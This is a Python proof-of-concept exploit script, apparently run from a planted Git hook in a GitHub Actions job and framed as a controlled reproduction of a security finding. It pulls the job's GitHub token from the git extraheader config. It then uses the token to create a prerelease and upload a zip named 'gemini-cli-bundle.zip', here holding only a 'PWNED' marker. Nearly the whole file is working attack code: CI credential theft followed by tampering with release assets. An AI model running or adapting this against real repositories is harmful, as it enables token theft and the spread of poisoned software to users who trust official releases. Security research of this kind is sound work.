#!/usr/bin/env python3
"""Safe release-asset writer for controlled finding 1bcb39 reproduction."""
import base64
import http.client
import io
import json
import os
from pathlib import Path
import subprocess
import sys
import urllib.parse
import zipfile

ATTACK_TAG = "v0.0.2-pwnreq-attacker-asset"
SOURCE_COMMIT = "08e9a20f749aefcbda38622ac757899c3d6216e0"
ASSET_NAME = "gemini-cli-bundle.zip"
MARKER_NAME = "pwned.txt"
MARKER_BYTES = b"PWNED\n"


def request(host, method, path, authorization, body=None, content_type="application/vnd.github+json"):
    connection = http.client.HTTPSConnection(host, timeout=20)
    headers = {
        "Accept": "application/vnd.github+json",
        "Authorization": authorization,
        "User-Agent": "pwnreq-controlled-1bcb39-probe",
        "X-GitHub-Api-Version": "2022-11-28",
    }
    if body is not None:
        headers["Content-Type"] = content_type
        headers["Content-Length"] = str(len(body))
    connection.request(method, path, body=body, headers=headers)
    response = connection.getresponse()
    status = response.status
    data = response.read()
    connection.close()
    return status, data


def api_json(repository, method, suffix, authorization, payload=None):
    body = None if payload is None else json.dumps(payload, separators=(",", ":")).encode()
    status, data = request("api.github.com", method, f"/repos/{repository}{suffix}", authorization, body)
    parsed = json.loads(data) if data else None
    return status, parsed


def marker_zip():
    stream = io.BytesIO()
    info = zipfile.ZipInfo(MARKER_NAME, date_time=(2020, 1, 1, 0, 0, 0))
    info.compress_type = zipfile.ZIP_DEFLATED
    info.external_attr = 0o100644 << 16
    with zipfile.ZipFile(stream, "w") as archive:
        archive.writestr(info, MARKER_BYTES)
    return stream.getvalue()


def main():
    workspace = Path(os.environ.get("GITHUB_WORKSPACE", ""))
    fixture_path = workspace / ".github" / "pwnreq-1bcb39-fixture.json"
    marker_path = workspace / ".github" / MARKER_NAME
    if not fixture_path.is_file() or marker_path.read_bytes() != MARKER_BYTES:
        return 40
    fixture = json.loads(fixture_path.read_text())
    repository = os.environ.get("GITHUB_REPOSITORY", "")
    if repository != fixture.get("repository") or fixture.get("source_commit") != SOURCE_COMMIT:
        return 41
    try:
        extraheader = subprocess.check_output(
            ["git", "config", "--get", "http.https://github.com/.extraheader"],
            text=True,
            stderr=subprocess.DEVNULL,
        ).strip()
    except subprocess.CalledProcessError:
        return 0
    prefix = "AUTHORIZATION: basic "
    if not extraheader.startswith(prefix):
        return 42
    authorization = extraheader.split(":", 1)[1].strip()

    status, release = api_json(repository, "GET", f"/releases/tags/{ATTACK_TAG}", authorization)
    if status == 404:
        status, release = api_json(
            repository,
            "POST",
            "/releases",
            authorization,
            {
                "tag_name": ATTACK_TAG,
                "target_commitish": "main",
                "name": "Controlled 1bcb39 release asset proof",
                "body": "Harmless controlled release created by the planted Git hook.",
                "draft": False,
                "prerelease": True,
            },
        )
    if status not in (200, 201) or not isinstance(release, dict) or not release.get("id"):
        return 43

    status, assets = api_json(repository, "GET", f"/releases/{release['id']}/assets", authorization)
    if status != 200 or not isinstance(assets, list):
        return 44
    if any(asset.get("name") == ASSET_NAME for asset in assets):
        return 0

    archive = marker_zip()
    upload_path = f"/repos/{repository}/releases/{release['id']}/assets?name={urllib.parse.quote(ASSET_NAME)}"
    status, _ = request("uploads.github.com", "POST", upload_path, authorization, archive, "application/zip")
    return 0 if status == 201 else 45


if __name__ == "__main__":
    sys.exit(main())
